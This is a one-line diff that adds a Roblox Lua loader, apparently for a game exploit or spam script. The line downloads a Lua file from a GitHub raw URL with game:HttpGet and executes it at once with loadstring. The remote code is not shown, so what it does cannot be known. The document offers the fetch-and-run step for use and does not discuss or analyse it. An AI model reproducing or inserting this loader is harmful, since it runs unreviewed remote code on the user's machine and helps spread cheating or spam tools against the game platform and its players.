@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/anniversary-daybreak-spam2-fvzf77lzoen9fn.lua"))()
